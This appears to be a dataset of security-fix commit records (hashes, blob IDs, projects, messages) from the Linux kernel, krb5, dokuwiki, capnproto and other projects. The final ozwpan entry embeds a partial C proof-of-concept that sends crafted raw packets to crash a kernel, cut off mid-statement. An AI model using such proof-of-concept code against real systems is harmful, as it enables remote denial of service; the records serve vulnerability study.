    c173f69e1479bfaf643b9e5c69f4c9a151b18c67
Blob(s) Before Fix: 
    c173f69e1479bfaf643b9e5c69f4c9a151b18c67
Projects:
    0-T-0_ps4-linux
Commit Message for db27ebb111e9f69efece08e4cb6a34ff980f8896:
net: rds: use correct size for max unacked packets and bytes\n\nMax unacked packets/bytes is an int while sizeof(long) was used in the sysctl table.\n\nThis means that when they were getting read we'd also leak kernel memory to userspace along with the timeout values.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    9425e16437439e68c7d96abef922167d68fafaff
File(s) In Commit: 
    rw.cpp
Blob(s) In Commit: 
    0b9318bfd1251628470cccb28017cfefeb61f8e8
Blob(s) Before Fix: 
    0b9318bfd1251628470cccb28017cfefeb61f8e8
Projects:
    1847123212_cryptopp
Commit Message for 9425e16437439e68c7d96abef922167d68fafaff:
Fix for CVE-2015-2141. Thanks to Evgeny Sidorov for reporting. Squaring to satisfy Jacobi requirements suggested by JPM.

======================================================================
Commit With Fix: 
    4970ad24ce49ec76a0ee67bca7594f918ced2f5f
File(s) In Commit: 
    lib/plugins/acl/remote.php
Blob(s) In Commit: 
    9433b770159f1598addc63f46782a779115ad70b
Blob(s) Before Fix: 
    9433b770159f1598addc63f46782a779115ad70b
Projects:
    122800_dokuwiki
Commit Message for 4970ad24ce49ec76a0ee67bca7594f918ced2f5f:
check permissions in ACL plugin's RPC API component. #1056\n\nSecurity Fix\n\nSeverity: Medium Type:     Remote Priviledge Escalation Remote:   yes\n\nVulnerability Details:\n\nThis fixes a security hole in the ACL plugins remote API component. The plugin failed to check for superuser permissions before executing ACL addition or deletion. This means everybody with permissions to call the XMLRPC API also had permissions to set up their own ACL rules and thus circumventing any existing rules.\n\nRisk Assessment:\n\nThe XMLRPC API in DokuWiki is marked experimental and off by default. It also implements an additional safeguard by giving access to a configured circle of users and groups only. So only a minor number of DokuWiki installations will be affected at all. For affected installations the risk is high if users with access to the API are not to be trusted. Thus the overall severity of medium.\n\nResolution:\n\nInstallations applying this commit are safe. A hotfix is about to be released. Meanwhile users are advised to disable the XMLRPC API in the config manager.

======================================================================
Commit With Fix: 
    b2f1e895038a5700bf8e81fb9a5da36cbdea0eeb
File(s) In Commit: 
    libraries/select_lang.lib.php
Blob(s) In Commit: 
    ab4c72554b7e4e8f49b5e7025c83f013dbedf9a1
Blob(s) Before Fix: 
    ab4c72554b7e4e8f49b5e7025c83f013dbedf9a1
Projects:
    007durgesh219_phpmyadmin
Commit Message for b2f1e895038a5700bf8e81fb9a5da36cbdea0eeb:
[security] Risk of BREACH attack\n\nThanks to Michal Čihař for the message suggestion.\n\nSigned-off-by: Marc Delisle <marc@infomarc.info>

======================================================================
Commit With Fix: 
    3bd8afbff29e50b38f889b2f688785a669b9aafc
File(s) In Commit: 
    requests/sessions.py
Blob(s) In Commit: 
    9d5498c6dbce1fc52cfbb1e02cabcce2eec49905
Blob(s) Before Fix: 
    9d5498c6dbce1fc52cfbb1e02cabcce2eec49905
Projects:
    01pooja_requests
Commit Message for 3bd8afbff29e50b38f889b2f688785a669b9aafc:
Don't ascribe cookies to the target domain.

======================================================================
Commit With Fix: 
    a0fb65205c7d7ff95f00eb9fd88e93b300f30c3d
File(s) In Commit: 
    src/node/utils/ExportEtherpad.js
Blob(s) In Commit: 
    46ae0d7af9e626c821f3f728b87925f7c0a814a2
Blob(s) Before Fix: 
    46ae0d7af9e626c821f3f728b87925f7c0a814a2
Projects:
    00SteinsGate00_etherpad-lite
Commit Message for a0fb65205c7d7ff95f00eb9fd88e93b300f30c3d:
oops, fix export with wildcards

======================================================================
Commit With Fix: 
    f343f0dbd0a2e87f17cd74f14186ed73e3fbdbfa
File(s) In Commit: 
    c++/src/capnp/layout.c++
Blob(s) In Commit: 
    a43dbcd6b2aa8bc3d3bebf65223046e18541afcb
Blob(s) Before Fix: 
    a43dbcd6b2aa8bc3d3bebf65223046e18541afcb
Projects:
    1815368076_capnproto
Commit Message for f343f0dbd0a2e87f17cd74f14186ed73e3fbdbfa:
SECURITY: Integer overflow in pointer validation.\n\nDetails: https://github.com/sandstorm-io/capnproto/tree/master/security-advisories/2014-03-02-0-c++-integer-overflow.md

======================================================================
Commit With Fix: 
    26bcceda72372211063d62aab7e45665faa83633
File(s) In Commit: 
    c++/src/capnp/layout.c++
Blob(s) In Commit: 
    5956bb9993efeec27ab068ea465ef6af042a8c28
Blob(s) Before Fix: 
    5956bb9993efeec27ab068ea465ef6af042a8c28
Projects:
    1815368076_capnproto
Commit Message for 26bcceda72372211063d62aab7e45665faa83633:
SECURITY: Integer underflow in pointer validation.\n\nDetails: https://github.com/sandstorm-io/capnproto/tree/master/security-advisories/2014-03-02-1-c++-integer-underflow.md

======================================================================
Commit With Fix: 
    b371da6b2d68b4cdd0f21d6342af6c42794f998b
File(s) In Commit: 
    mcs/class/Mono.Security/Mono.Security.Protocol.Tls/RecordProtocol.cs
Blob(s) In Commit: 
    e194013a637afde4ebff8792f8cc2e8884ba4381
Blob(s) Before Fix: 
    e194013a637afde4ebff8792f8cc2e8884ba4381
Projects:
    004307ec_mono
Commit Message for b371da6b2d68b4cdd0f21d6342af6c42794f998b:
Remove the client-side SSLv2 fallback.\n\n    There's almost no SSLv3 web site left so a v2 fallback is only extra     code we do not need to carry forward.

======================================================================
Commit With Fix: 
    f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4
File(s) In Commit: 
    arch/x86/kernel/cpu/microcode/intel_early.c
Blob(s) In Commit: 
    5e109a31f62bb0168f704bd04d725b8ff580df6e
Blob(s) Before Fix: 
    5e109a31f62bb0168f704bd04d725b8ff580df6e
Projects:
    0-T-0_ps4-linux
Commit Message for f84598bd7c851f8b0bf8cd0d7c3be0d73c432ff4:
x86/microcode/intel: Guard against stack overflow in the loader\n\nmc_saved_tmp is a static array allocated on the stack, we need to make sure mc_saved_count stays within its bounds, otherwise we're overflowing the stack in _save_mc(). A specially crafted microcode header could lead to a kernel crash or potentially kernel execution.\n\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Cc: "H. Peter Anvin" <hpa@zytor.com> Cc: Fenghua Yu <fenghua.yu@intel.com> Link: http://lkml.kernel.org/r/1422964824-22056-1-git-send-email-quentin.casasnovas@oracle.com Signed-off-by: Borislav Petkov <bp@suse.de>

======================================================================
Commit With Fix: 
    06c8173eb92bbfc03a0fe8bb64315857d0badd06
File(s) In Commit: 
    arch/x86/include/asm/xsave.h
Blob(s) In Commit: 
    c9a6d68b8d623b84d169f61c4680c194ea8d137a
Blob(s) Before Fix: 
    c9a6d68b8d623b84d169f61c4680c194ea8d137a
Projects:
    0-T-0_ps4-linux
Commit Message for 06c8173eb92bbfc03a0fe8bb64315857d0badd06:
x86/fpu/xsaves: Fix improper uses of __ex_table\n\nCommit:\n\n  f31a9f7c7169 ("x86/xsaves: Use xsaves/xrstors to save and restore xsave area")\n\nintroduced alternative instructions for XSAVES/XRSTORS and commit:\n\n  adb9d526e982 ("x86/xsaves: Add xsaves and xrstors support for booting time")\n\nadded support for the XSAVES/XRSTORS instructions at boot time.\n\nUnfortunately both failed to properly protect them against faulting:\n\nThe 'xstate_fault' macro will use the closest label named '1' backward and that ends up in the .altinstr_replacement section rather than in .text. This means that the kernel will never find in the __ex_table the .text address where this instruction might fault, leading to serious problems if userspace manages to trigger the fault.\n\nSigned-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Signed-off-by: Jamie Iles <jamie.iles@oracle.com> [ Improved the changelog, fixed some whitespace noise. ] Acked-by: Borislav Petkov <bp@alien8.de> Acked-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: <stable@vger.kernel.org> Cc: Allan Xavier <mr.a.xavier@gmail.com> Cc: H. Peter Anvin <hpa@zytor.com> Cc: Thomas Gleixner <tglx@linutronix.de> Fixes: adb9d526e982 ("x86/xsaves: Add xsaves and xrstors support for booting time") Fixes: f31a9f7c7169 ("x86/xsaves: Use xsaves/xrstors to save and restore xsave area") Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    4de930efc23b92ddf88ce91c405ee645fe6e27ea
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    245330ca0015c2fd2548ead861d379714151c901
Blob(s) Before Fix: 
    245330ca0015c2fd2548ead861d379714151c901
Projects:
    0-T-0_ps4-linux
Commit Message for 4de930efc23b92ddf88ce91c405ee645fe6e27ea:
net: validate the range we feed to iov_iter_init() in sys_sendto/sys_recvfrom\n\nCc: stable@vger.kernel.org # v3.19 Signed-off-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    f0c094a1b745d91ef2f9a4eae2149aac026a5789
File(s) In Commit: 
    src/lib/krb5/krb/bld_princ.c
Blob(s) In Commit: 
    8604268ceb883d4c0b2a1499b24ddb32bc59424a
Blob(s) Before Fix: 
    8604268ceb883d4c0b2a1499b24ddb32bc59424a
Projects:
    3van_krb5
Commit Message for f0c094a1b745d91ef2f9a4eae2149aac026a5789:
Fix build_principal memory bug [CVE-2015-2697]\n\nIn build_principal_va(), use k5memdup0() instead of strdup() to make a copy of the realm, to ensure that we allocate the correct number of bytes and do not read past the end of the input string.  This bug affects krb5_build_principal(), krb5_build_principal_va(), and krb5_build_principal_alloc_va().  krb5_build_principal_ext() is not affected.\n\nCVE-2015-2697:\n\nIn MIT krb5 1.7 and later, an authenticated attacker may be able to cause a KDC to crash using a TGS request with a large realm field beginning with a null byte.  If the KDC attempts to find a referral to answer the request, it constructs a principal name for lookup using krb5_build_principal() with the requested realm.  Due to a bug in this function, the null byte causes only one byte be allocated for the realm field of the constructed principal, far less than its length. Subsequent operations on the lookup principal may cause a read beyond the end of the mapped memory region, causing the KDC process to crash.\n\nCVSSv2: AV:N/AC:L/Au:S/C:N/I:N/A:C/E:POC/RL:OF/RC:C\n\nticket: 8252 (new) target_version: 1.14 tags: pullup

======================================================================
Commit With Fix: 
    b4ecd95debaf0a8712bd1d34def83f41fc6b3579
File(s) In Commit: 
    lib/paperclip_processors/cropper.rb
Blob(s) In Commit: 
    184afddb1e49e8477b6d377de72c157d6b8a943d
Blob(s) Before Fix: 
    184afddb1e49e8477b6d377de72c157d6b8a943d
Projects:
    ANiWarlock_papercrop
Commit Message for b4ecd95debaf0a8712bd1d34def83f41fc6b3579:
Sanitized crop input, logs with Paperclip log function if anything weird happens

======================================================================
Commit With Fix: 
    956421fbb74c3a6261903f3836c0740187cf038b
File(s) In Commit: 
    arch/x86/kernel/entry_64.S
Blob(s) In Commit: 
    1d74d161687c9f2a71f334b5530067356310af18
Blob(s) Before Fix: 
    1d74d161687c9f2a71f334b5530067356310af18
Projects:
    0-T-0_ps4-linux
Commit Message for 956421fbb74c3a6261903f3836c0740187cf038b:
x86/asm/entry/64: Remove a bogus 'ret_from_fork' optimization\n\n'ret_from_fork' checks TIF_IA32 to determine whether 'pt_regs' and the related state make sense for 'ret_from_sys_call'.  This is entirely the wrong check.  TS_COMPAT would make a little more sense, but there's really no point in keeping this optimization at all.\n\nThis fixes a return to the wrong user CS if we came from int 0x80 in a 64-bit task.\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Cc: Borislav Petkov <bp@alien8.de> Cc: Denys Vlasenko <dvlasenk@redhat.com> Cc: H. Peter Anvin <hpa@zytor.com> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: <stable@vger.kernel.org> Link: http://lkml.kernel.org/r/4710be56d76ef994ddf59087aad98c000fbab9a4.1424989793.git.luto@amacapital.net [ Backported from tip:x86/asm. ] Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    bd20bb02e75e2c0483832b52f2577253febfb690
File(s) In Commit: 
    das_watchdog.c
Blob(s) In Commit: 
    8473fe8752783e53069098fd46acc55015964615
Blob(s) Before Fix: 
    8473fe8752783e53069098fd46acc55015964615
Projects:
    atsampson_das_watchdog
Commit Message for bd20bb02e75e2c0483832b52f2577253febfb690:
Fix memory overflow if the name of an environment is larger than 500 characters. Bug found by Adam Sampson.

======================================================================
Commit With Fix: 
    668ece96be210e742a4e2820a3085b215cf55104
File(s) In Commit: 
    server/src/main/java/com/orientechnologies/orient/server/network/protocol/http/OHttpSessionManager.java
Blob(s) In Commit: 
    51a16a4349e206c787b580c2c25ef380bff41df0
Blob(s) Before Fix: 
    51a16a4349e206c787b580c2c25ef380bff41df0
Projects:
    21arunava_orientdb
Commit Message for 668ece96be210e742a4e2820a3085b215cf55104:
Adopted SecureRandom to avoid predicable random numbers in session

======================================================================
Commit With Fix: 
    6fd99094de2b83d1d4c8457f2c83483b2828e75a
File(s) In Commit: 
    net/ipv6/ndisc.c
Blob(s) In Commit: 
    14ecdaf06bf7497dc71199fc5638b49592a24655
Blob(s) Before Fix: 
    14ecdaf06bf7497dc71199fc5638b49592a24655
Projects:
    0-T-0_ps4-linux
Commit Message for 6fd99094de2b83d1d4c8457f2c83483b2828e75a:
ipv6: Don't reduce hop limit for an interface\n\nA local route may have a lower hop_limit set than global routes do.\n\nRFC 3756, Section 4.2.7, "Parameter Spoofing"\n\n>   1.  The attacker includes a Current Hop Limit of one or another small >       number which the attacker knows will cause legitimate packets to >       be dropped before they reach their destination.\n\n>   As an example, one possible approach to mitigate this threat is to >   ignore very small hop limits.  The nodes could implement a >   configurable minimum hop limit, and ignore attempts to set it below >   said limit.\n\nSigned-off-by: D.S. Ljungmark <ljungmark@modio.se> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3ed82f4ed0095768529afc22b923c8f7171fff70
File(s) In Commit: 
    print-wb.c
Blob(s) In Commit: 
    4fa5e3800fbf3b341a212c848fe6a3926ea94e08
Blob(s) Before Fix: 
    4fa5e3800fbf3b341a212c848fe6a3926ea94e08
Projects:
    0xmitsurugi_tcpdump
Commit Message for 3ed82f4ed0095768529afc22b923c8f7171fff70:
whiteboard: fixup a few reversed tests (GH #446)\n\nThis is a follow-up to commit 3a3ec26.

======================================================================
Commit With Fix: 
    3746b7627218438ae7d781fc8b18a221454e9091
File(s) In Commit: 
    src/daemon/abrt-handle-upload.in
Blob(s) In Commit: 
    e812ef045a5accc585c2f2c2946280f4aa61d693
Blob(s) Before Fix: 
    e812ef045a5accc585c2f2c2946280f4aa61d693
Projects:
    AlexxNica_abrt
Commit Message for 3746b7627218438ae7d781fc8b18a221454e9091:
upload: validate and sanitize uploaded dump directories\n\nIt was discovered that, when moving problem reports from /var/spool/abrt-upload to /var/spool/abrt or /var/tmp/abrt, abrt-handle-upload does not verify that the new problem directory has appropriate permissions and does not contain symbolic links.  A crafted problem report exposes other parts of abrt to attack, and the abrt-handle-upload script allows to overwrite arbitrary files.\n\nAcknowledgement:\n\nThis issue was discovered by Florian Weimer of Red Hat Product Security.\n\nRelated: #1212953\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>

======================================================================
Commit With Fix: 
    d7759d3ddae5fe99a340c88a1d370d65cfa73fd6
File(s) In Commit: 
    sos/sosreport.py
Blob(s) In Commit: 
    99b5f47085fba9a292baea6d9fdd67f149844029
Blob(s) Before Fix: 
    99b5f47085fba9a292baea6d9fdd67f149844029
Projects:
    Amitgb14_sos
Commit Message for d7759d3ddae5fe99a340c88a1d370d65cfa73fd6:
[sosreport] fix archive permissions regression\n\nRestore the umask save/restore around archive creation and ensure the effective umask is 077 at the time of archive creation.\n\nFixes #425.\n\nSigned-off-by: Bryn M. Reeves <bmr@redhat.com>

======================================================================
Commit With Fix: 
    48d9951d879e0c8cbb59d4b64ab59d53ef88310d
File(s) In Commit: 
    artemis-selector/src/main/java/org/apache/activemq/artemis/selector/filter/XalanXPathEvaluator.java
Blob(s) In Commit: 
    007f5ff13ab1798d204bbc51ceb8dbb5ca760175
Blob(s) Before Fix: 
    007f5ff13ab1798d204bbc51ceb8dbb5ca760175
Projects:
    1984shekhar_activemq-artemis
Commit Message for 48d9951d879e0c8cbb59d4b64ab59d53ef88310d:
ActiveMQ6-112 Add defaults to the selector parser doc builder

======================================================================
Commit With Fix: 
    ee73f656a604d5aa9df86a97102e4e462dd79924
File(s) In Commit: 
    arch/x86/kvm/i8254.c
Blob(s) In Commit: 
    15578f180e596bee481f10451ec375b6ceb37f26
Blob(s) Before Fix: 
    15578f180e596bee481f10451ec375b6ceb37f26
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for ee73f656a604d5aa9df86a97102e4e462dd79924:
KVM: PIT: control word is write-only\n\nPIT control word (address 0x43) is write-only, reads are undefined.\n\nCc: stable@kernel.org Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    aca8d4f898b436ff6754e1a9ab96cae976c8a853
File(s) In Commit: 
    tlslite/tlsrecordlayer.py
Blob(s) In Commit: 
    06e5597da7f49ea1399eee1aca3aafa867ccacb9
Blob(s) Before Fix: 
    06e5597da7f49ea1399eee1aca3aafa867ccacb9
Projects:
    0xDiBa_tlslite
Commit Message for aca8d4f898b436ff6754e1a9ab96cae976c8a853:
Fix IndexError on junk message.

======================================================================
Commit With Fix: 
    6b7339f4c31ad69c8e9c0b2859276e22cf72176d
File(s) In Commit: 
    mm/memory.c
Blob(s) In Commit: 
    388dcf9aa283c83ee78dcf22503de253e812a27d
Blob(s) Before Fix: 
    388dcf9aa283c83ee78dcf22503de253e812a27d
Projects:
    0-T-0_ps4-linux
Commit Message for 6b7339f4c31ad69c8e9c0b2859276e22cf72176d:
mm: avoid setting up anonymous pages into file mapping\n\nReading page fault handler code I've noticed that under right circumstances kernel would map anonymous pages into file mappings: if the VMA doesn't have vm_ops->fault() and the VMA wasn't fully populated on ->mmap(), kernel would handle page fault to not populated pte with do_anonymous_page().\n\nLet's change page fault handler to use do_anonymous_page() only on anonymous VMA (->vm_ops == NULL) and make sure that the VMA is not shared.\n\nFor file mappings without vm_ops->fault() or shred VMA without vm_ops, page fault on pte_none() entry would lead to SIGBUS.\n\nSigned-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Willy Tarreau <w@1wt.eu> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    9b6e6a8334d56354853f9c255d1395c2ba570e0a
File(s) In Commit: 
    arch/x86/entry/entry_64.S
Blob(s) In Commit: 
    8668bbdd2bcac4792fdfe73f9e3181549a92f7fb
Blob(s) Before Fix: 
    8668bbdd2bcac4792fdfe73f9e3181549a92f7fb
Projects:
    0-T-0_ps4-linux
Commit Message for 9b6e6a8334d56354853f9c255d1395c2ba570e0a:
x86/nmi/64: Switch stacks on userspace NMI entry\n\nReturning to userspace is tricky: IRET can fail, and ESPFIX can rearrange the stack prior to IRET.\n\nThe NMI nesting fixup relies on a precise stack layout and atomic IRET.  Rather than trying to teach the NMI nesting fixup to handle ESPFIX and failed IRET, punt: run NMIs that came from user mode on the normal kernel stack.\n\nThis will make some nested NMIs visible to C code, but the C code is okay with that.\n\nAs a side effect, this should speed up perf: it eliminates an RDMSR when NMIs come from user mode.\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Reviewed-by: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    810bc075f78ff2c221536eb3008eac6a492dba2d
File(s) In Commit: 
    arch/x86/entry/entry_64.S
Blob(s) In Commit: 
    d8ab2b201fa197c05f24ca3361c94169123cbca4
Blob(s) Before Fix: 
    d8ab2b201fa197c05f24ca3361c94169123cbca4
Projects:
    0-T-0_ps4-linux
Commit Message for 810bc075f78ff2c221536eb3008eac6a492dba2d:
x86/nmi/64: Use DF to avoid userspace RSP confusing nested NMI detection\n\nWe have a tricky bug in the nested NMI code: if we see RSP pointing to the NMI stack on NMI entry from kernel mode, we assume that we are executing a nested NMI.\n\nThis isn't quite true.  A malicious userspace program can point RSP at the NMI stack, issue SYSCALL, and arrange for an NMI to happen while RSP is still pointing at the NMI stack.\n\nFix it with a sneaky trick.  Set DF in the region of code that the RSP check is intended to detect.  IRET will clear DF atomically.\n\n( Note: other than paravirt, there's little need for all this   complexity. We could check RIP instead of RSP. )\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Cc: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    ccfe8c3f7e52ae83155cb038753f4c75b774ca8a
File(s) In Commit: 
    arch/x86/crypto/aesni-intel_glue.c
Blob(s) In Commit: 
    54f60ab41c63025fd2cb42e5579df7f69c3d9b60
Blob(s) Before Fix: 
    54f60ab41c63025fd2cb42e5579df7f69c3d9b60
Projects:
    0-T-0_ps4-linux
Commit Message for ccfe8c3f7e52ae83155cb038753f4c75b774ca8a:
crypto: aesni - fix memory usage in GCM decryption\n\nThe kernel crypto API logic requires the caller to provide the length of (ciphertext || authentication tag) as cryptlen for the AEAD decryption operation. Thus, the cipher implementation must calculate the size of the plaintext output itself and cannot simply use cryptlen.\n\nThe RFC4106 GCM decryption operation tries to overwrite cryptlen memory in req->dst. As the destination buffer for decryption only needs to hold the plaintext memory but cryptlen references the input buffer holding (ciphertext || authentication tag), the assumption of the destination buffer length in RFC4106 GCM operation leads to a too large size. This patch simply uses the already calculated plaintext size.\n\nIn addition, this patch fixes the offset calculation of the AAD buffer pointer: as mentioned before, cryptlen already includes the size of the tag. Thus, the tag does not need to be added. With the addition, the AAD will be written beyond the already allocated buffer.\n\nNote, this fixes a kernel crash that can be triggered from user space via AF_ALG(aead) -- simply use the libkcapi test application from [1] and update it to use rfc4106-gcm-aes.\n\nUsing [1], the changes were tested using CAVS vectors to demonstrate that the crypto operation still delivers the right results.\n\n[1] http://www.chronox.de/libkcapi.html\n\nCC: Tadeusz Struk <tadeusz.struk@intel.com> Cc: stable@vger.kernel.org Signed-off-by: Stephan Mueller <smueller@chronox.de> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    8b01fc86b9f425899f8a3a8fc1c47d73c2c20543
File(s) In Commit: 
    fs/exec.c
Blob(s) In Commit: 
    49a1c61433b73722683cad25eef1fb92045e265a
Blob(s) Before Fix: 
    49a1c61433b73722683cad25eef1fb92045e265a
Projects:
    0-T-0_ps4-linux
Commit Message for 8b01fc86b9f425899f8a3a8fc1c47d73c2c20543:
fs: take i_mutex during prepare_binprm for set[ug]id executables\n\nThis prevents a race between chown() and execve(), where chowning a setuid-user binary to root would momentarily make the binary setuid root.\n\nThis patch was mostly written by Linus Torvalds.\n\nSigned-off-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    c41e8885b862b9fce2719449bc9336f0bea658ef
File(s) In Commit: 
    lib/Module/Signature.pm
Blob(s) In Commit: 
    51cef598e44a164435b1b80faba36d4e8a6658b8
Blob(s) Before Fix: 
    51cef598e44a164435b1b80faba36d4e8a6658b8
Projects:
    bk_module-signature
Commit Message for c41e8885b862b9fce2719449bc9336f0bea658ef:
* Avoid loading modules from relative paths in @INC for Text::Diff etc.\n\n  Also reported by John Lightsey.

======================================================================
Commit With Fix: 
    e8714f6f93d1a32f4e4655209960afcf4c185214
File(s) In Commit: 
    libavcodec/h264.c
Blob(s) In Commit: 
    06d8dec82e4e0c7963866d28d15ee95b209d5159
Blob(s) Before Fix: 
    06d8dec82e4e0c7963866d28d15ee95b209d5159
Projects:
    00ERNEST00_FFmpeg
Commit Message for e8714f6f93d1a32f4e4655209960afcf4c185214:
avcodec/h264: Clear delayed_pic on deallocation\n\nFixes use of freed memory\n\nFixes: case5_av_frame_copy_props.mp4 Found-by: Michal Zalewski <lcamtuf@coredump.cx> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>

======================================================================
Commit With Fix: 
    a134f083e79fb4c3d0a925691e732c56911b4326
File(s) In Commit: 
    net/ipv4/ping.c
Blob(s) In Commit: 
    05ff44b758dfee1e02996a3726ac63854a96ad16
Blob(s) Before Fix: 
    05ff44b758dfee1e02996a3726ac63854a96ad16
Projects:
    0-T-0_ps4-linux
Commit Message for a134f083e79fb4c3d0a925691e732c56911b4326:
ipv4: Missing sk_nulls_node_init() in ping_unhash().\n\nIf we don't do that, then the poison value is left in the ->pprev backlink.\n\nThis can cause crashes if we do a disconnect, followed by a connect().\n\nTested-by: Linus Torvalds <torvalds@linux-foundation.org> Reported-by: Wen Xu <hotdog3645@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    04bf464a5dfd9ade0dda918e44366c2c61fce80b
File(s) In Commit: 
    drivers/staging/ozwpan/ozusbsvc1.c
Blob(s) In Commit: 
    7b13dc9101721a9a602115671659078c7b2e934a
Blob(s) Before Fix: 
    7b13dc9101721a9a602115671659078c7b2e934a
Projects:
    0-T-0_ps4-linux
Commit Message for 04bf464a5dfd9ade0dda918e44366c2c61fce80b:
ozwpan: divide-by-zero leading to panic\n\nA network supplied parameter was not checked before division, leading to a divide-by-zero. Since this happens in the softirq path, it leads to a crash. A PoC follows below, which requires the ozprotocol.h file from this module.\n\n=-=-=-=-=-=\n\n #include <arpa/inet.h>  #include <linux/if_packet.h>  #include <net/if.h>  #include <netinet/ether.h>  #include <stdio.h>  #include <string.h>  #include <stdlib.h>  #include <endian.h>  #include <sys/ioctl.h>  #include <sys/socket.h>\n\n #define u8 uint8_t  #define u16 uint16_t  #define u32 uint32_t  #define __packed __attribute__((__packed__))  #include "ozprotocol.h"\n\nstatic int hex2num(char c) { 	if (c >= '0' && c <= '9') 		return c - '0'  	if (c >= 'a' && c <= 'f') 		return c - 'a' + 10  	if (c >= 'A' && c <= 'F') 		return c - 'A' + 10  	return -1  } static int hwaddr_aton(const char *txt, uint8_t *addr) { 	int i  	for (i = 0  i < 6  i++) { 		int a, b  		a = hex2num(*txt++)  		if (a < 0) 			return -1  		b = hex2num(*txt++)  		if (b < 0) 			return -1  		*addr++ = (a << 4) | b  		if (i < 5 && *txt++ != ':') 			return -1  	} 	return 0  }\n\nint main(int argc, char *argv[]) { 	if (argc < 3) { 		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0])  		return 1  	}\n\n	uint8_t dest_mac[6]  	if (hwaddr_aton(argv[2], dest_mac)) { 		fprintf(stderr, "Invalid mac address.\n")  		return 1  	}\n\n	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)  	if (sockfd < 0) { 		perror("socket")  		return 1  	}\n\n	struct ifreq if_idx  	int interface_index  	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1)  	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) { 		perror("SIOCGIFINDEX")  		return 1  	} 	interface_index = if_idx.ifr_ifindex  	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) { 		perror("SIOCGIFHWADDR")  		return 1  	} 	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data \n\n	struct { 		struct ether_header ether_header  		struct oz_hdr oz_hdr  		struct oz_elt oz_elt  		struct oz_elt_connect_req oz_elt_connect_req  		struct oz_elt oz_elt2  		struct oz_multiple_fixed oz_multiple_fixed  	} __packed packet = { 		.ether_header = { 			.ether_type = htons(OZ_ETHERTYPE), 			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] }, 			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 		}, 		.oz_hdr = { 			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT), 			.last_pkt_num = 0, 			.pkt_num = htole32(0) 		}, 		.oz_elt = { 			.type = OZ_ELT_CONNECT_REQ, 			.length = sizeof(struct oz_elt_connect_req) 		}, 		.oz_elt_connect_req = { 			.mode = 0, 			.resv1 = {0}, 			.pd_info = 0, 			.session_id = 0, 			.presleep = 0, 			.ms_isoc_latency = 0, 			.host_vendor = 0, 			.keep_alive = 0, 			.apps = htole16((1 << OZ_APPID_USB) | 0x1), 			.max_len_div16 = 0, 			.ms_per_isoc = 0, 			.up_audio_buf = 0, 			.ms_per_elt = 0 		}, 		.oz_elt2 = { 			.type = OZ_ELT_APP_DATA, 			.length = sizeof(struct oz_multiple_fixed) 		}, 		.oz_multiple_fixed = { 			.app_id = OZ_APPID_USB, 			.elt_seq_num = 0, 			.type = OZ_USB_ENDPOINT_DATA, 			.endpoint = 0, 			.format = OZ_DATA_F_MULTIPLE_FIXED, 			.unit_size = 0, 			.data = {0} 		} 	} \n\n	struct sockaddr_ll socket_address = { 		.sll_ifindex = interface_index, 		.sll_halen = ETH_ALEN, 		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] } 	} \n\n	if (sendto(sockfd, 